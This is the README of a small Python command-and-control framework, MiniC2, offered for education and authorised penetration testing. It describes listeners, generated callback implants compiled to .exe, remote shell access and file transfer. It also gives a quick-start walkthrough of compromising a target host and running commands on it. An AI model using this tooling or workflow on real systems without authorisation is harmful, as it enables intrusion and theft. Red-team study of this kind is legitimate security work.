<p align="center">
  <h1 align="center">🎯 MiniC2</h1>
  <p align="center">A lightweight, modular Command & Control framework built in Python</p>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/python-3.8+-blue?style=for-the-badge&logo=python&logoColor=white" />
  <img src="https://img.shields.io/badge/platform-windows-lightgrey?style=for-the-badge&logo=windows" />
  <img src="https://img.shields.io/badge/license-MIT-green?style=for-the-badge" />
</p>

---

> [!WARNING]
> **This project is for educational and authorized security testing purposes only.**
> Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

## 📖 Overview

MiniC2 is a minimal yet extensible Command & Control framework designed for learning and authorized penetration testing. It features multi-protocol support, modular commands, automatic payload generation, and real-time session management - all in pure Python with zero third-party runtime dependencies.

## ✨ Features

- **Multi-Protocol Listeners** - TCP, HTTP, and HTTPS (with auto-generated SSL certs)
- **Session Management** - Track, interact with, and monitor multiple sessions simultaneously
- **Dead Session Detection** - Background monitor automatically detects and alerts on dead sessions
- **Payload Generation** - Auto-generates Python payloads and compiles to standalone `.exe` via PyInstaller
- **Interactive Shell** - Drop into a remote system shell
- **File Transfer** - Upload and download files to/from targets
- **Modular Architecture** - Easily extend with custom commands and session commands
- **Logging** - All operations are logged to `logs/minic2.log`

## 🏗️ Architecture

```
MiniC2/
├── main.py                     # Entry point
├── requirements.txt            # Dependencies
├── core/
│   ├── framework.py            # Main CLI loop & command dispatcher
│   ├── listener.py             # TCP & HTTP/S listener implementations
│   ├── session.py              # TCP & HTTP session classes
│   ├── session_manager.py      # Session tracking, interaction & monitoring
│   └── payload_generator.py    # Payload templating & compilation
├── commands/                   # Framework-level commands (auto-loaded)
│   ├── base.py                 # Base command class
│   ├── listener.py             # Start listeners
│   ├── generate.py             # Generate payloads
│   ├── sessions.py             # List active sessions
│   ├── use.py                  # Interact with a session
│   ├── kill.py                 # Kill a session
│   └── help.py                 # Display help info
├── session_commands/           # Per-session commands (auto-loaded)
│   ├── base.py                 # Base session command class
│   ├── shell.py                # Remote shell access
│   ├── upload.py               # Upload files to target
│   ├── download.py             # Download files from target
│   └── sysinfo.py              # Gather system information
├── payloads/
│   └── templates/
│       └── client_template.py  # Client implant template
└── logs/
    └── minic2.log              # Runtime log file
```

## 🚀 Getting Started

### Prerequisites

- Python 3.8+
- `pip` (Python package manager)
- OpenSSL (optional, for HTTPS listener - auto-generates certs)

### Installation

```bash
git clone https://github.com/ItzSubhadip/MiniC2.git
cd MiniC2
pip install -r requirements.txt
```

### Launch the Framework

```bash
python main.py
```

You'll be greeted with an interactive console:

```
MiniC2 Framework (Type 'help' for commands)
c2 >
```

## 📘 Usage

### Framework Commands

| Command | Usage | Description |
|---------|-------|-------------|
| `help` | `help [command]` | Display available commands or detailed usage |
| `listener` | `listener <protocol> <ip> <port>` | Start a TCP, HTTP, or HTTPS listener |
| `generate` | `generate <protocol> <ip> <port>` | Generate a client payload |
| `sessions` | `sessions` | List all active sessions |
| `use` | `use <session_id>` | Interact with a specific session |
| `kill` | `kill <session_id>` | Close and remove a session |

### Session Commands

Once inside a session (`use <id>`), these commands are available:

| Command | Usage | Description |
|---------|-------|-------------|
| `shell` | `shell` | Drop into an interactive remote shell |
| `sysinfo` | `sysinfo` | Retrieve target system information |
| `upload` | `upload <local_file> <remote_file>` | Upload a file to the target |
| `download` | `download <remote_file> <local_file>` | Download a file from the target |
| `bg` | `bg` | Background the current session |
| `exit` | `exit` | Close and terminate the session |

### Quick Start Example

```bash
# 1. Start a TCP listener
c2 > listener tcp 0.0.0.0 4444

# 2. Generate a payload for the target
c2 > generate tcp 192.168.1.100 4444

# 3. Deploy the generated payload on the target machine
#    (found in payloads/generated/)

# 4. When the target connects, you'll see:
# [+] New session 1 from ('192.168.1.50', 54321)

# 5. Interact with the session
c2 > use 1

# 6. Run commands on the target
session 1 > shell
session 1 (shell) > whoami
desktop-target\user

session 1 (shell) > exit
session 1 > sysinfo
session 1 > bg

# 7. Back at main console
c2 > sessions
```

## 🔌 Extending MiniC2

### Adding a Framework Command

Create a new file in `commands/` (e.g., `commands/mycommand.py`):

```python
from commands.base import BaseCommand

class Command(BaseCommand):
    name = "mycommand"
    description = "Description of what it does"
    usage = "mycommand <arg>"

    def execute(self, args):
        # Your logic here
        print("Hello from mycommand!")
```

The command is **automatically loaded** on startup - no registration needed.

### Adding a Session Command

Create a new file in `session_commands/` (e.g., `session_commands/screenshot.py`):

```python
from session_commands.base import BaseSessionCommand

class SessionCommand(BaseSessionCommand):
    name = "screenshot"
    description = "Take a screenshot of the target"
    usage = "screenshot"

    def execute(self, args):
        self.session.send({"type": "screenshot"})
        result = self.session.receive()
        # Handle the result...
```

> **Note:** You'll also need to add the corresponding handler in the client template (`payloads/templates/client_template.py`).

## 🔒 Protocol Details

| Protocol | Transport | Encryption | Callback Style |
|----------|-----------|------------|----------------|
| **TCP** | Raw socket | None | Persistent connection |
| **HTTP** | HTTP polling | None | Beacon (2–5s jitter) |
| **HTTPS** | HTTP polling | TLS (auto-cert) | Beacon (2–5s jitter) |

## ⚠️ Disclaimer

This tool is provided **as-is** for **educational purposes** and **authorized security testing** only. The author assumes no liability for misuse. Always ensure you have explicit written permission before conducting any security testing.

## 📄 License

This project is licensed under the [MIT License](LICENSE).
